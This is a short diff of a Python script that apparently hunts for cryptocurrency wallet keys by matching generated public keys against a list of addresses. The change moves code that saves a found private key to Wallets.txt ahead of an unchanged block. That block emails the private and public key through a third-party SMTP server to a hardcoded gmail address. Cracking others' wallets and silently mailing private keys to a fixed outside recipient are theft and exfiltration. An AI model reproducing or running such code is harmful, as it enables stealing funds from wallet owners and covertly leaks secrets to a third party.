@@ -58,6 +58,14 @@ def seek(r):
 		with open(filename) as f:
 			for line in f:
 				if pub in line:
+					f = open('Wallets.txt','a')
+					f.write(priv)
+					f.write('     ')
+					f.write(pub)
+					f.write('\n')
+					f.close()
+					time.sleep(30)
+					print ('WINNER WINNER CHICKEN DINNER!!! ---- ' +datetime.now().strftime('%Y-%m-%d %H:%M:%S'), pub, priv)
 					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv) + "YEI"
 					text = msg
 					server = smtplib.SMTP("mail.remittancetoken.io", 587)
@@ -68,14 +76,6 @@ def seek(r):
 					toaddr = "batataprodz@gmail.com"
 					server.sendmail(fromaddr, toaddr, text)
 					print(text)
-					f = open('Wallets.txt','a')
-					f.write(priv)
-					f.write('     ')
-					f.write(pub)
-					f.write('\n')
-					f.close()
-					time.sleep(30)
-					print ('WINNER WINNER CHICKEN DINNER!!! ---- ' +datetime.now().strftime('%Y-%m-%d %H:%M:%S'), pub, priv)
 					break
 					
 
